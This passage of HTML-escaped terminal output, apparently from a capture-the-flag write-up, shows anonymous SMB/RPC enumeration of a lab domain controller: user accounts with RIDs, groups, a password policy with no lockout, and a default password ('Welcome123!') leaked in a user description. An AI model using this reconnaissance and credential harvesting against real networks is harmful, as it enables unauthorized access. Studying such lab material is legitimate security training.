&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    OS information on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.169 from smbclient: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.169 from srvinfo:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Users on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[Administrator] rid:[0x1f4]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[Guest] rid:[0x1f5]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[krbtgt] rid:[0x1f6]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[DefaultAccount] rid:[0x1f7]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[ryan] rid:[0x451]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[marko] rid:[0x457]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[sunita] rid:[0x19c9]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[abigail] rid:[0x19ca]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[marcus] rid:[0x19cb]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[sally] rid:[0x19cc]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[fred] rid:[0x19cd]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[angela] rid:[0x19ce]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[felicia] rid:[0x19cf]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[gustavo] rid:[0x19d0]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[ulf] rid:[0x19d1]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[stevie] rid:[0x19d2]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[claire] rid:[0x19d3]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[paulo] rid:[0x19d4]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[steve] rid:[0x19d5]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[annette] rid:[0x19d6]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[annika] rid:[0x19d7]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[per] rid:[0x19d8]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[claude] rid:[0x19d9]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[melanie] rid:[0x2775]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[zach] rid:[0x2776]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[simon] rid:[0x2777]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[naoki] rid:[0x2778]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Share Enumeration on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;SMB1 disabled -- no workgroup available
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attempting to map shares on 10.10.10.169
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Password Policy Information for 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attaching to 10.10.10.169 using a NULL share
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Trying protocol 445/SMB...
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Found domain(s):
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Builtin
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Password Info for Domain: MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password length: 7
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password history length: 24
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Maximum password age: Not Set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password Complexity Flags: 000000
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Refuse Password Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Store Cleartext: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Lockout Admins: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Clear Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Anon Change: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Complex: 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password age: 1 day 4 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Reset Account Lockout Counter: 30 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Locked Account Duration: 30 minutes 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Account Lockout Threshold: None
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Forced Log off Time: Not Set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Retieved partial password policy with rpcclient:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Groups on 10.10.10.169    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin groups:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Account Operators] rid:[0x224]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Incoming Forest Trust Builders] rid:[0x22d]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Windows Authorization Access Group] rid:[0x230]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Terminal Server License Servers] rid:[0x231]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Administrators] rid:[0x220]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Users] rid:[0x221]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Guests] rid:[0x222]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Print Operators] rid:[0x226]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Backup Operators] rid:[0x227]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Replicator] rid:[0x228]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Desktop Users] rid:[0x22b]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Network Configuration Operators] rid:[0x22c]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Monitor Users] rid:[0x22e]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Log Users] rid:[0x22f]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Distributed COM Users] rid:[0x232]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[IIS_IUSRS] rid:[0x238]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Cryptographic Operators] rid:[0x239]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Event Log Readers] rid:[0x23d]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Certificate Service DCOM Access] rid:[0x23e]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Remote Access Servers] rid:[0x23f]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Endpoint Servers] rid:[0x240]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Management Servers] rid:[0x241]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Hyper-V Administrators] rid:[0x242]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Access Control Assistance Operators] rid:[0x243]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Management Users] rid:[0x244]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[System Managed Accounts Group] rid:[0x245]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Storage Replica Administrators] rid:[0x246]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Server Operators] rid:[0x225]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin group memberships:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;IIS_IUSRS&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 568) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;System Managed Accounts Group&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 581&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 560) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 554&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Remote Management Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 580) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 546&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Event Log Readers&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 545) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Administrators&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 544) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cert Publishers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x205&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RAS and IAS Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x229&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Allowed RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;DnsAdmins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1101&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 572) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x200&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x201&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x202&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Computers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x203&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x204&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Schema Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x206&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x207&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Group Policy Creator Owners&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x208&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x209&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cloneable Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Protected Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Key Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Key Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsUpdateProxy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Contractors&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;efaultAccount
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;rbtgt
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;yan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;arko
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;unita
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;bigail
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;arcus
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ally
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;red
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ngela
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;elicia
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;ustavo
